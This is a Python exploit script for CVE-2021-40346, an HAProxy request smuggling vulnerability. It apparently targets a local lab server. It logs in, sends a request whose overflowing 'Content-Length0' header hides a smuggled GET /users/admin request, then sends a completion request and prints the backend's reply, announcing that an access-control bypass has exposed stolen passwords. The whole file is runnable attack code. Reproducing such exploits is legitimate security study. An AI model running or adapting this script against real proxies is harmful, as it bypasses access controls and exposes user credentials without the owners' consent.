#!/usr/bin/env python3
import socket
import time

TARGET = "127.0.0.1"
PORT = 8080

print("CVE-2021-40346: Two-Request Technique (JFrog Method)")

# Login
print("\n Login...")
body = "username=alice&password=alice123"
login = f"POST /login HTTP/1.1\r\nHost: {TARGET}:{PORT}\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: {len(body)}\r\n\r\n{body}".encode()

sock = socket.socket()
sock.connect((TARGET, PORT))
sock.sendall(login)
time.sleep(0.5)
resp = b""
while True:
    chunk = sock.recv(4096)
    if not chunk:
        break
    resp += chunk
sock.close()

session = resp.decode().split('session=')[1].split(';')[0]
print(f" Session: {session[:35]}...")

# REQUEST 1: Poison the original request
print("\n Sending poison request (incomplete smuggled request)...")

# Smuggled request 
smuggled_incomplete = f"GET /users/admin HTTP/1.1\r\nCookie: session={session}\r\nDUMMY:"

overflow_header = "Content-Length0" + ("a" * 255)

poison = (
    f"POST / HTTP/1.1\r\n"
    f"Host: {TARGET}:{PORT}\r\n"
    f"{overflow_header}:\r\n"
    f"Content-Length: {len(smuggled_incomplete)}\r\n"
    f"\r\n"
    f"{smuggled_incomplete}"
).encode()

sock = socket.socket()
sock.connect((TARGET, PORT))
sock.sendall(poison)
time.sleep(1)

# Get first response
resp1 = sock.recv(4096)
print(f"   Poison sent, got: {resp1.decode()[:60]}...")

# Complete the smuggled request
print("\nSending completion request...")

completion = (
    f"GET / HTTP/1.1\r\n"
    f"Host: {TARGET}:{PORT}\r\n"
    f"\r\n"
).encode()

sock.sendall(completion)
time.sleep(2)

# this is to capture the response of the smuggled request
all_data = b""
sock.settimeout(5)
try:
    while True:
        chunk = sock.recv(4096)
        if not chunk:
            break
        all_data += chunk
except:
    pass
sock.close()

text = all_data.decode('utf-8', errors='ignore')

print(f"\n[RESULTS] {len(all_data)} bytes received")
print("="*70)
print(text)
print("="*70)

if "admin_secret" in text:
    print("\nSUCCESS! BYPASSED HAPROXY ACL!")
    print(" Stolen passwords visible in response above!")
else:
    print("\nCheck backend logs - smuggling is working but response capture needs adjustment")